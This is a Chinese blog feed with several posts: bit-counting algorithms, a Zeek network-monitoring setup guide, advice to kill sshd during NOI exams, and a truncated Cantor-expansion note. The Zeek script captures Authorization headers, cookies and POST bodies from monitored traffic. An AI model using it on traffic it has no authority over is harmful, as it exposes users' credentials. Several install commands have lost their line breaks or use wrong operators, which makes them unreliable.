        <content type="html"><![CDATA[<h1 id="统计二进制数中1的个数">统计二进制数中<strong>1</strong>的个数</h1><h2 id="内置位计数功能">内置位计数功能</h2><p>C++内置了计算函数。</p><h3 id="代码">代码</h3><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token function">__builtin_popcount</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="复杂度分析">复杂度分析</h3><ul><li>时间复杂度：<span class="math inline">\(\Theta(1)\)</span>。实现方法各异，可以近似认为其时间复杂度为 <span class="math inline">\(\Theta (1)\)</span>。</li><li>空间复杂度：<span class="math inline">\(\Theta (1)\)</span>。</li></ul><h2 id="移位实现位计数">移位实现位计数</h2><p>记 <span class="math inline">\(s = x \oplusy\)</span>，我们可以不断地检查 <span class="math inline">\(s\)</span>的最低位，如果最低位为 <span class="math inline">\(1\)</span>，那么令计数器加一，然后我们令 <span class="math inline">\(s\)</span> 整体右移一位，这样 <span class="math inline">\(s\)</span>的最低位将被舍去，原本的次低位就变成了新的最低位。我们重复这个过程直到<span class="math inline">\(s=0\)</span> 为止。这样计数器中就累计了<span class="math inline">\(s\)</span> 的二进制表示中 <span class="math inline">\(1\)</span> 的数量。</p><h3 id="代码-1">代码</h3><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">while</span> <span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">{</span>    ret <span class="token operator">+=</span> s <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">;</span>    s <span class="token operator">&gt;&gt;=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="复杂度分析-1">复杂度分析</h3><ul><li>时间复杂度：<span class="math inline">\(\Theta (\logn)\)</span></li><li>空间复杂度：<span class="math inline">\(\Theta (1)\)</span></li></ul><h2 id="brian-kernighan-算法">Brian&nbsp;Kernighan 算法</h2><p>在<strong>移位实现位计数</strong>算法中，对于 <span class="math inline">\(s=(10001100)_2\)</span> 的情况，我们需要循环右移<span class="math inline">\(8\)</span>次才能得到答案。而实际上如果我们可以跳过两个 <span class="math inline">\(1\)</span> 之间的 <span class="math inline">\(0\)</span>，直接对 <span class="math inline">\(1\)</span> 进行计数，那么就只需要循环 <span class="math inline">\(3\)</span> 次即可。</p><p>我们可以使用 <strong>Brian&nbsp;Kernighan</strong>算法进行优化，具体地，该算法可以被描述为这样一个结论：记 <span class="math inline">\(f(x)\)</span> 表示 <span class="math inline">\(x\)</span> 和 <span class="math inline">\(x-1\)</span> 进行与运算所得的结果，即 <span class="math inline">\(f(x)=x~\&amp;~(x-1)\)</span>，那么 <span class="math inline">\(f(x)\)</span> 恰为 <span class="math inline">\(x\)</span> 删去其二进制表示中最右侧的 <span class="math inline">\(1\)</span> 的结果。</p><p>基于该算法，只需要不断让 <span class="math inline">\(s =f(s)\)</span>，直到 <span class="math inline">\(s=0\)</span>即可。这样每循环一次，<span class="math inline">\(s\)</span>都会删去其二进制表示中最右侧的 <span class="math inline">\(1\)</span>，最终循环的次数即为 <span class="math inline">\(s\)</span> 的二进制表示中 <span class="math inline">\(1\)</span> 的数量。</p><h3 id="代码-2">代码</h3><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">while</span> <span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">{</span>    s <span class="token operator">&amp;=</span> s <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    ret<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="复杂度分析-2">复杂度分析</h3><ul><li>时间复杂度：<span class="math inline">\(\Theta (\logn)\)</span></li><li>空间复杂度：<span class="math inline">\(\Theta (1)\)</span>。</li></ul><h2 id="参考">参考</h2><ul><li>Brian W. Kernighan and Dennis&nbsp;M.&nbsp;Ritchie,The&nbsp;C&nbsp;Programming&nbsp;Language&nbsp;(Second&nbsp;Edition)</li><li>Peter&nbsp;Wegner, CACM3, 1960</li></ul>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ACM </tag>
            
            <tag> 数学 </tag>
            
            <tag> 算法 </tag>
            
            <tag> 二进制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>流量分析的瑞士军刀：Zeek</title>
      <link href="/2022/02/13/liu-liang-fen-xi-de-rui-shi-jun-dao-zeek/"/>
      <url>/2022/02/13/liu-liang-fen-xi-de-rui-shi-jun-dao-zeek/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍">介绍</h1><h2 id="概览">概览</h2><p>Zeek是一个开源的、被动网络流量分析软件。它主要被用作安全监测设备来检查链路上的所有流量中是否有恶意活动的痕迹。但更普遍地，Zeek支持大量安全领域外的流量分析任务，包括性能测量和帮助排查问题。</p><p>在一个地方部署Zeek，将会得到大量不同类型的<em>日志文件</em>，它们详细记录了当前网络中的活动信息。这些日志不仅包含了当前网络中每一个连接的详细记录，而且还包含了应用层信息，比如，所有的HTTP会话以及他们的请求URI、关键头部字段、MIME类型和服务器响应；DNS请求和响应；SSL证书；SMTP会话的关键信息；诸如此类。默认情况下，Zeek把这些信息写入以tab分隔的日志文件中以便其它软件进行后续的处理。但用户也可以选择其它的输出格式和后端存储，比如数据库。</p><p>除了日志外，Zeek还内置了许多用于一系列分析和检测任务的功能，包括从HTTP会话中提取文件，通过外部接口检测恶意软件，报告网络上看到的易受攻击的软件版本，识别流行的web应用，检测SSH爆破，验证SSL证书链，等等。</p><p>但是，理解Zeek的关键在于意识到即使系统已经内置了如此强大的功能，它本质上还是一个用于流量分析的完全可自定义、可修改的<em>平台</em>：Zeek提供给用户一种特定领域的、图灵完全的<em>脚本语言</em>用于表达任意的分析任务。概念上，你可以认为Zeek是“特定领域的Python”（或者Perl）：就像Python一样，系统内置了大量的功能（“标准库”），但你并没有被局限于系统附带的功能，而是可以通过编写你自己的代码来使用Zeek。事实上，所有Zeek的默认分析，包括所有的日志记录，是这些脚本的结果；没有硬编码的特定分析在系统的核心代码中。</p><p>Zeek可以运行在标准硬件上，因此提供了相对于昂贵的专有方案的低成本替代方案。除了价格外，Zeek在能力方面也远远地走在了其它网络监测工具的前面，它们始终都只能执行一些硬编码的分析任务。我们尤其要强调Zeek并不是传统意义上的基于特征的入侵检测系统（IDS）。尽管它确实支持这样的功能，但Zeek的脚本语言实际上极大地丰富了寻找恶意活动的方法，包括语义误用、异常检测以及行为分析。</p><p>许多地方部署Zeek是为了保护它们的网络基础设施，包括许多大学、研究机构、超算中心、开放科学组织以及大公司。Zeek主要关注于高速率、大流量的网络监测，而且越来越多的地方正在使用系统来监测它们的10GE网络，其中一些甚至已经开始使用100GE的链路。Zeek通过可扩展的负载均衡来达到如此高的性能：这些地方通常运行“Zeek集群”——一个高速率的前端负载均衡设备分发流量到多个后端PC，每个PC运行Zeek实例来分析它们那份流量。中央管理系统负责协调进程，在后端之间同步状态以及向操作人员提供一个中央管理界面用配置和查看聚合后的日志。Zeek的管理框架——ZeekControl——支持开箱即用的集群配置。</p><h2 id="特性">特性</h2><p>Zeek通过它的脚本语言支持一系列的分析。然而即使不做修改它也自带了一整套功能。</p><ul><li><p>部署</p><ul><li>运行在标准硬件上的类Unix系统中（包括Linux、FreeBSD和MacOS）。</li><li>连接网络分流器或者监控端口的完全被动式的分析。</li><li>使用标准的libpcap接口用于捕获数据包。</li><li>实时和离线分析。</li><li>对于大规模部署的集群支持。</li><li>对于单独和集群部署的统一管理框架。</li><li>使用BSD开源协议。</li></ul></li><li><p>分析</p><ul><li>用于离线分析和取证的全面的活动日志。</li><li>端口无关的应用层协议分析。</li><li>支持许多应用层协议（包括DNS、FTP、HTTP、IRC、SMTP、SSH、SSL）。</li><li>通过应用层协议传输的文件内容分析，包括MD5/SHA1指纹计算。</li><li>全面的IPv6支持。</li><li>隧道检测和分析（包括Ayiya、Teredo、GTPv1）。Zeek解开隧道的封装然后继续分析它们的内容，就好像没有隧道一样。</li><li>协议分析过程中广泛的完整性检查。</li><li>支持IDS形式的模式匹配。</li></ul></li><li><p>脚本语言</p><ul><li>能够表达任意分析任务的图灵完全语言。</li><li>基于事件的编程模型。</li><li>特地领域的数据类型，比如IP地址（透明地处理IPv4和IPv6）、端口和计时器。</li><li>广泛支持跟踪和管理随着时间变化的网络状态。</li></ul></li><li><p>接口</p><ul><li>默认输出到结构化的ASCII日志中。</li><li>可选的后端有ElasticSearch和DataSeries。其它的数据库接口还在计划中。</li><li>外部输入实时集成到分析中。数据库的实时输入还在计划中。</li><li>和外部程序交换Zeek事件的C函数库。实现了Perl、Python和Ruby的绑定。</li><li>能够在脚本语言中触发任意的外部进程。</li></ul></li></ul><h2 id="历史">历史</h2><p><a href="https://zeek-docs-cn.readthedocs.io/zh_CN/chinese/_images/history.png"><img src="https://googles.plus/images/loading.gif" data-original="D:\sfc9982-blog\source\images\history.png" alt="Zeek History Timeline"></a></p><p>Zeek的历史时间线（点击以放大）</p><p>Zeek的历史比大多数人意识到的还要悠久（以前叫做“Bro”，不是“Zeek”）。<a href="http://www.icir.org/vern">Vern Paxson</a>于20年前设计和实现了最初的版本。Vern在1995年开始编写代码，当时他还是 <a href="http://www.lbl.gov/">Lawrence Berkeley National Laboratory(LBNL)</a>的一个研究员。伯克利实验室在1996年开始了实际的部署，然后USENIX SecuritySymposium杂志在1998年发表了Bro的最初的论文（后来在2003年的 <a href="http://www.icir.org/vern/papers/bro-CN99.pdf">期刊论文</a>中进行了完善改进）。2003年， <a href="http://www.nsf.gov/">NationalScience Foundation (NSF)</a> 开始支持 <a href="http://www.icsi.berkeley.edu/">International Computer ScienceInstitute (ICSI)</a> Bro的研究和开发，现在Vern正在领导ICSI下的 <a href="http://www.icir.org/">Networking and Security 小组</a>。在过去的这些年里，一个由ICSI研究者和学生组成的不断增长的团队不断为Zeek添加新的功能，而且LBNL仍然在<a href="http://www.doe.gov/">Department of Energy (DOE)</a>的资助下继续支持。</p><p>许多Zeek的能力都起源于学术研究项目，研究结果经常发表在顶级会议上。但是，Zeek成功的关键是从一开始就弥合了传统的学术研究和实际应用之间的裂隙，这为研究提供了坚实的基础来保证构想的方案代表了真实世界的挑战。甚至，随着Zeek用户群体的增长，以研究为中心的开发模式最终成为了系统演进的瓶颈：研究经费并不愿意支持软件开发和维护这样平凡的事情，即使这些事情对于用户体验非常重要。虽然Zeek的能力总是远在传统的系统之上，但是一次成功的部署过去常常需要杰出的专业技术，而且还要投入大量时间与Zeek陡峭的学习曲线做斗争。在2010年，NSF开始着手解决这个问题，通过授予ICSI权限，让它从SDCI项目脱离出来以完全致力于Zeek的开发工作。在NSF的支持下，<a href="http://www.ncsa.illinois.edu/">National Center forSupercomputing Applications (NCSA)</a>加入团队成为了主要的伙伴，然后项目从2.0版本开始修复许多用户反映的问题。自从这个版本发布以来，Zeek在不同环境下的部署数量经历了巨大的增长，现在Zeek团队正在此基础上继续努力增强系统的能力以面对未来网络的挑战。</p><h2 id="架构">架构</h2><p><a href="https://zeek-docs-cn.readthedocs.io/zh_CN/chinese/_images/architecture.png"><img src="https://googles.plus/images/loading.gif" data-original="D:\sfc9982-blog\source\images\architecture.png" alt="Zeek Architecture"></a></p><p>Zeek的内部架构。</p><p>架构上，Zeek分为两层。它的 <em>事件引擎</em> （或者 <em>core</em>）把进入的数据包流简化为一系列高级的 <em>事件</em>。这些事件以策略无关的形式反映了网络活动，比如，他们描述了 <em>什么</em>已经出现，而不是 <em>为什么</em>，或者是否它是特别的。举个例子，网络中的每一个HTTP请求会生成一个相应的<code>http_request</code>事件，它包含了涉及到的IP地址和端口、请求的URL以及使用的HTTP版本。但是这个事件并没有传递出更进一步的<em>解释</em> ，比如，URI是否和恶意网站有关系。</p><p>更高级的语义实际上是由Zeek的第二个主要组件实现的，它负责执行一系列使用Zeek脚本语言编写的<em>事件处理</em>程序。这些脚本能够表达安全策略，比如，当监测设备检测到不同类型的活动时该采取什么活动。更普遍地，它们能够从输入流量中得到任何想要的属性和统计数据。Zeek语言内置了许多特定领域的类型和支持功能；而且，更重要的是，允许脚本维护时间状态，从而使得它们能够对不同会话和主机之间的通信进行追踪和关联。Zeek脚本能够生成实时的警报和执行任意的外部程序，比如，触发对一次攻击的积极响应。</p><h2 id="安装">安装</h2><p>Zeek 的安装还是比较简单的，笔者主要是在 Mac 上以及 Linux上安装。这两个操作系统的安装方式还是比较类似的。对于 Linux而言，需要安装一些依赖包：</p><pre class="line-numbers language-none"><code class="language-none">sudo yum install cmake make gcc gcc-c++ flex bison libpcap-devel openssl-devel python-devel swig zlib-devel<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里我有遇到一个问题就是可能你的 Redhat 镜像源里面没有包含libpcap-devel，因为这个包在可选的范围内，而内网的服务器又没有互联网连接。可以通过手工下载相应版本的libpcap 以及 libpcap-devel 即可。</p><p>Mac 上需要的依赖更少一点，首先需要确保安装了xcode-select，如果没有安装，可以通过 xcode-select --install来进行安装。Mac 上只需要安装依赖 cmake, swig, openssl, bison即可，可以通过 Homebrew 来进行安装。</p><p>依赖包安装完毕之后就可以安装Zeek，其实是可以通过包管理工具来进行安装的，不过这里我推荐使用基于源码的安装方式，安装比较简单而且还容易排查问题。从Zeek 的 Github <a href="https://github.com/zeek/zeek/releases">Release</a>即可下载源码包，目前我安装的是 3.0.0版本，注意一点是，如果使用最新的版本，可能需要 7.0 以上版本的cmake，因为需要 C++17 的语言特性。而一般镜像源默认的 cmake版本是4+版本，所以如果你的服务器也无法上互联网，建议可以安装 3.0.0版本。</p><pre class="line-numbers language-none"><code class="language-none">./configure &amp; make &amp; make install<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装使用上面的命令就可以了，不过 make的时间还是比较长的，这个取决于你机器的性能，不过一般安装还是需要半个小时到一个小时，这也是因为C++ 编译速度比较慢的原因。</p><h2 id="集群安装">集群安装</h2><p>集群安装的方式和单机的方式不太一样。之前在测试环境使用的都是单机模式，集群则可以管理多个实例，后来我也尝试了通过集群的方式来进行安装。如果需要配置集群的话，建议安装PF_RING，PF_RING 可以加速网络包的速度。对于 Zeek 集群上的每个 worker都是需要安装 PF_RING，但只需要在 manager 上安装 Zeek 就可以了，可以通过zeekctl 在其它 worker 上安装 Zeek。不过需要确保可以通过 ssh 到其它 woker机器上，可以通过公钥的形式来实现，将 manager 的公钥放到其它 worker 的authorized_keys 中。</p><p>PF_RING的安装步骤相对来说多了一些，但也是按照说明安装即可。和上面的单机安装方式不同的是集群安装的方式的时候，安装Zeek 需要配置前缀。</p><p>安装 PF_RING</p><pre class="line-numbers language-none"><code class="language-none">tar xvzf PF_RING-5.6.2.tar.gzcd PF_RING-5.6.2/userland/lib./configure --prefix=/opt/pfringmake installcd ../libpcap./configure --prefix=/opt/pfringmake installcd ../tcpdump-4.1.1./configure --prefix=/opt/pfringmake installcd ../../kernelmakemake installmodprobe pf_ring enable_tx_capture=0 min_num_slots=32768<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>安装 Zeek</p><pre class="line-numbers language-none"><code class="language-none">./configure --with-pcap=/opt/pfringmake make install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>确保 Zeek 正确关联到了 PF_RING 中的 libpcap 库中</p><pre class="line-numbers language-none"><code class="language-none">ldd /usr/local/zeek/bin/zeek | grep pcap      libpcap.so.1 =&gt; /opt/pfring/lib/libpcap.so.1 (0x00007fa6d7d24000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>接着就是通过 PF_RING 来进行 Zeekctl 的配置，Zeek 的安装路径一般都在/usr/local/zeek。通过 /usr/local/zeek/etc/node.cfg来进行集群结点的配置，在集群配置中，manager, proxy 以及 worker是必须的，如果不设置 logger，默认将 manager 作为 logger。</p><pre class="line-numbers language-none"><code class="language-none">[worker-1]type=workerhost=10.0.0.50interface=eth0lb_method=pf_ringlb_procs=10pin_cpus=2,3,4,5,6,7,8,9,10,11<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来只需要通过 zeekctl install就会在其它实例上来进行安装了。如果安装过程中出现了问题，可以通过 zeekctldiag woker-1 来排查具体的原因。</p><h2 id="zeek-结合被动扫描器的玩法">Zeek 结合被动扫描器的玩法</h2><p>上面讲的都是 Zeek 的安装，下面聊一下 Zeek和被动扫描器的结合。被动扫描器的效果往往取决于流量的质量和数量，在我们的实际实践中，发现通过Zeek 获取的流量占我们被动扫描器测试流量的绝大一部分。Zeek 对于 http解析的日志都会存储在 /usr/local/zeek/logs 中。如果 Zeek 是启动状态，那么http.log 的路径会在 /usr/local/zeel/logs/current中，而历史日志则会被打包。如果使用 Zeek去捕获流量的时候，日志往往会占很大的存储，所以要记得修改 Zeek日志的存储路径，否则很容易就把系统盘塞满。</p><h3 id="通过脚本自定义-http.log">通过脚本自定义 http.log</h3><p>http.log 中其实已经包含了丰富的字段，常见的一些字段如下：</p><pre class="line-numbers language-none"><code class="language-none"># ts          uid          orig_h        orig_p  resp_h         resp_p1311627961.8  HSH4uV8KVJg  192.168.1.100 52303   192.150.187.43 80<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>不过里面还有一些信息是缺失的，比如一些 http 请求头以及 POST请求的请求体，为了添加这些字段，可以通过自定义 Zeek 脚本来实现，Zeek脚本的能力真的非常强大，通过脚本其实有很多更高级的玩法。</p><p><strong>添加请求头</strong></p><pre class="line-numbers language-none"><code class="language-none">@load base/protocols/http/mainmodule HTTP;export {    redef record Info += {            header_host:    string  &amp;log    &amp;optional;            header_accept:  string  &amp;log    &amp;optional;            header_accept_charset:  string  &amp;log    &amp;optional;            header_accept_encoding:  string  &amp;log    &amp;optional;            header_accept_language:  string  &amp;log    &amp;optional;            header_accept_ranges:  string  &amp;log    &amp;optional;            header_authorization:  string  &amp;log    &amp;optional;            header_connection:  string  &amp;log    &amp;optional;            header_cookie:  string  &amp;log    &amp;optional;            header_content_length:  string  &amp;log    &amp;optional;            header_content_type:  string  &amp;log    &amp;optional;    };}event http_header(c: connection, is_orig: bool, name: string, value: string) &amp;priority=3        {        if ( ! c?$http )                return;        if ( is_orig )                {                if ( log_client_header_names )                        {                switch ( name ) {                                case "HOST":                                    c$http$header_host = value;                                    break;                                case "ACCEPT":                                    c$http$header_accept = value;                                    break;                                case "ACCEPT-CHARSET":                                    c$http$header_accept_charset = value;                                    break;                                case "ACCEPT-ENCODING":                                    c$http$header_accept_encoding = value;                                    break;                                case "ACCEPT-LANGUAGE":                                    c$http$header_accept_language = value;                                    break;                                case "ACCEPT-RANGES":                                    c$http$header_accept_ranges = value;                                    break;                                case "AUTHORIZATION":                                    c$http$header_authorization = value;                                    break;                                case "CONNECTION":                                    c$http$header_connection = value;                                    break;                                case "COOKIE":                                    c$http$header_cookie = value;                                    break;                                case "CONTENT-LENGTH":                                    c$http$header_content_length = value;                                    break;                                case "CONTENT-TYPE":                                    c$http$header_content_type = value;                                    break;                                }            }                }        }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>添加 POST 请求体</strong></p><pre class="line-numbers language-none"><code class="language-none">export {    ## The length of POST bodies to extract.    const http_post_body_length = 200 &amp;redef;}redef record HTTP::Info += {    postdata: string &amp;log &amp;optional;};event log_post_bodies(f: fa_file, data: string)    {    for ( cid in f$conns )        {        local c: connection = f$conns[cid];        if ( ! c$http?$postdata )            c$http$postdata = "";        # If we are already above the captured size here, just return.        if ( |c$http$postdata| &gt; http_post_body_length )            return;        c$http$postdata = c$http$postdata + data;        if ( |c$http$postdata| &gt; http_post_body_length )            {            c$http$postdata = c$http$postdata[0:http_post_body_length] + "...";            }        }    }event file_over_new_connection(f: fa_file, c: connection, is_orig: bool)    {    if ( is_orig &amp;&amp; c?$http &amp;&amp; c$http?$method &amp;&amp; c$http$method == "POST" )        {        Files::add_analyzer(f, Files::ANALYZER_DATA_EVENT, [$stream_event=log_post_bodies]);        }    }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过上述的脚本就可以添加一些请求头以及 POST请求的请求体，完整的脚本可以参考 <a href="https://github.com/neal1991/http-custom">http-custom</a>。脚本编写完毕，需要通过zeekctl 部署才能生效，步骤也非常简单。</p><pre class="line-numbers language-none"><code class="language-none">mv http-custom /usr/local/bro/share/bro/base/protocolsecho '@load base/protocols/http-custom' &gt;&gt; /usr/local/bro/share/bro/site/local.brozeekctl deploy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>对于被动扫描器，我们目前的方案是通过 Filebeat 去采集日志然后输出给Logstash 做处理，处理完毕之后再输出到 Kafka。</p><figure><img src="https://googles.plus/images/loading.gif" data-original="D:\sfc9982-blog\source\images\1588149952_5ea93ec061aba.png!small" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><p>Filebeat 加 Logstash适用于多种场景，在日常的各种日志采集场景都能派上用场。通过 Logstash可以完成日志灵活的处理，因为 Logstash里面包含了各种丰富的插件，几乎可以完成对于日志的任何操作。比如为了保证POST 请求体保证传输的正确性，可以通过 base64 来进行编码。通过 <a href="https://github.com/tiwilliam/logstash-filter-base64">logstash-filter-base64</a>可以遍历地实现字段的编码或者解码。通过 filter 中的 mutate插件可以增加字段或者删除字段。</p><pre class="line-numbers language-none"><code class="language-none">base64 {     field =&gt; "postdata"     action =&gt; "encode"   }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>通过这种方案还有一个优势就是我们还可以将我们的日志输出到别的地方，比如es，这个也可以方便后续排查日志问题。</p><p>不过我在后面又发现了一种新的方案，可以通过 Zeek 的插件，将 http.log直接输出到 Kafka，这个方案的优点主要是更高效，同时也节省了一些成本，毕竟Logstash需要的机器性能还是比较大的。对于这个方案主要是两个问题，第一个问题是首先需要处理好日志的格式，这样保证后续处理地便利性；第二个问题是如何将日志直接从Zeek 输出到Kafka。其实我是先解决了第一个问题再解决第二个问题的，因为第二个问题的处理的方式更灵活，得益于Zeek 脚本的便利性，肯定是可以实现的。</p><figure><img src="https://googles.plus/images/loading.gif" data-original="D:\sfc9982-blog\source\images\1588149963_5ea93ecb4cdad.png!small" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><p><a href="https://github.com/apache/metron-bro-plugin-kafka">metron-bro-plugin-kafka</a>是 Apache 官方的一个 Bro 的插件，不过因为 Zeek3.0.0是可以兼容的，所以这个插件是可以使用的。这个插件有两种安装方式，一种是通过bro-pkg (Bro的官方包管理工具)来进行安装，另外一种则是通过手工安装。由于网络的原因，我更推荐使用手工安装的方式，我尝试通过bro-pkg 的方式来进行安装，速度特别慢。</p><p>安装 librdkafka</p><pre class="line-numbers language-none"><code class="language-none">curl -L https://github.com/edenhill/librdkafka/archive/v0.11.5.tar.gz | tar xvzcd librdkafka-0.11.5/./configure --enable-saslmakesudo make install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>安装插件</p><pre class="line-numbers language-none"><code class="language-none">./configure --bro-dist=$BRO_SRCmakesudo make install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这里有一个坑就是安装文档根本就没有说 $BRO_SRC是哪个路径，所以安装的时候总是报错，后来才弄清楚这个路径其实就是当初Zeek 解压后的路径，即 Zeek 安装包的路径。</p><p>验证结果</p><pre class="line-numbers language-none"><code class="language-none">zeek -N Apache::KafkaApache::Kafka - Writes logs to Kafka (dynamic, version 0.3)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>接着就是将 http 的日志进行处理，因为在原始的 http.log中有还多字段是我们并不需要的。在研究了官方文档之后，可以通过 <a href="https://docs.zeek.org/en/master/frameworks/logging.html#filters">Filters</a>可以定义一个新的日志文件，可以拷贝其它的日志输出到新的文件，可以自定义字段，方式比较灵活。另外还可以通过Writer 可以将日志写入到 sqlite数据库中。不过，这里我们主要是通过插件将日志写入到 Kafka。</p><p>我们的目标是获取 http.log 中的部分字段，所以可以通过 Filters来实现日志文件的复制并且对日志字段进行过滤，基于 KafkaWriter将日志文件直接写入到 Kafka 中。为了定义 Filter，在<code>/usr/local/zeek/share/zeek/base/protocols/http/main.zeek</code> 的zeek_init 函数中进行定义：</p><pre class="line-numbers language-none"><code class="language-none">event zeek_init() &amp;priority=5     {     Log::create_stream(HTTP::LOG, [$columns=Info, $ev=log_http, $path="http"]);     Analyzer::register_for_ports(Analyzer::ANALYZER_HTTP, ports);     local filter: Log::Filter =         [         $name="kafka-http",         $include=set("host","id.resp_p","uri"),         $writer=Log::WRITER_KAFKAWRITER         ];      Log::add_filter(HTTP::LOG, filter);     }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>另外，记得在 <code>/usr/local/zeek/share/zeek/site/local.zeek</code>中定义 Kafka 的 topic 和 Broker:</p><pre class="line-numbers language-none"><code class="language-none">redef Kafka::topic_name = "bro-test";redef Kafka::kafka_conf = table(    ["metadata.broker.list"] = "127.0.0.1:9092");<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>最后记得使用 <code>zeekctl deploy</code>重新部署一下，这样脚本就生效了，日志就可以直接写入到 Kafka中，大大提高效率。</p>]]></content>
      
      
      <categories>
          
          <category> 网络工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 流量分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NOI系列考试的考场代码安全</title>
      <link href="/2022/02/12/noi-xi-lie-kao-shi-de-kao-chang-dai-ma-an-quan/"/>
      <url>/2022/02/12/noi-xi-lie-kao-shi-de-kao-chang-dai-ma-an-quan/</url>
      
        <content type="html"><![CDATA[<h1 id="noi系列考试的考场代码安全">NOI系列考试的考场代码安全</h1><h2 id="背景">背景</h2><p>Linux一般作为服务器使用，而服务器一般放在机房，你不可能在机房操作你的 Linux服务器。</p><p>这时我们就需要远程登录到Linux服务器来管理维护系统。</p><p>Linux 系统中是通过 ssh 服务实现的远程登录功能，默认 ssh 服务端口号为22。</p><h2 id="tldr">TL;DR</h2><p><code>pkill sshd</code></p><h2 id="防范">防范</h2><p><code>sshd</code> 是 Linux 中 ssh 服务端的进程</p><p>如果你要 <code>ssh</code> 登入别人电脑，别人的电脑中 sshd一定要是运行着的</p><p>由于 Linux 一般作为服务器使用，所以大多数都安装了<code>sshd</code></p><p>sshd 的开启和关闭都可以通过 <code>service/systemctl</code> 实现</p><p>用 <code>service ssh {stop|start|restart}</code>来实现停止，启动，重启</p><p>如果关闭心切可以直接 <code>pkill sshd</code></p><p>记住到考场上如果没有关闭交换机，一定要物理断网或关闭 ssh。</p>]]></content>
      
      
      
        <tags>
            
            <tag> NOI </tag>
            
            <tag> ssh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【算法笔记】康托展开</title>
      <link href="/2022/02/12/suan-fa-bi-ji-kang-tuo-zhan-kai/"/>
      <url>/2022/02/12/suan-fa-bi-ji-kang-tuo-zhan-kai/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍">介绍</h2><p>康托展开是一个全排列到一个自然数的双射，常用于构建哈希表时的空间压缩。康托展开的实质是计算当前排列在所有由小到大全排列中的顺序，因此是可逆的。</p><h2 id="公式">公式</h2><p><span class="math inline">\(X=a_n(n-1)!+a_{n-1}(n-2)!+\cdots+a_1\cdot0!\)</span><br>其中, <span class="math inline">\(a_{i}\)</span> 为整数,并且 <span class="math inline">\(0\leq a_{i}&lt;i,1\leq i\leq n\)</span> 。<br><span class="math inline">\(a_{i}\)</span>的意义参见举例中的解释部分</p><h3 id="解释">解释</h3><p>因为排列是按字典序排名的，因此越靠前的数字优先级越高。也就是说如果两个排列的某一位之前的数字都相同，那么如果这一位如果不相同，就按这一位排序。</p><h3 id="举例">举例</h3><p>例如，<span class="math inline">\(3~5~7~4~1~2~9~6~8\)</span> 展开为<span class="math inline">\(98884\)</span>。因为<span class="math inline">\(X=2*8!+3*7!+4*6!+2*5!+0*4!+0*3!+2*2!+0*1!+0*0!=98884\)</span>.</p><p>解释：</p><p>排列的第一位是3，比3小的数有两个，以这样的数开始的排列有8!个，因此第一项为2*8!</p><p>排列的第二位是5，比5小的数有1、2、3、4，由于3已经出现，因此共有3个比5小的数，这样的排列有7!个，因此第二项为3*7!</p><p>以此类推，直至0*0!</p><h2 id="用途">用途</h2><p>显然，<span class="math inline">\(n\)</span>位<span class="math inline">\((0 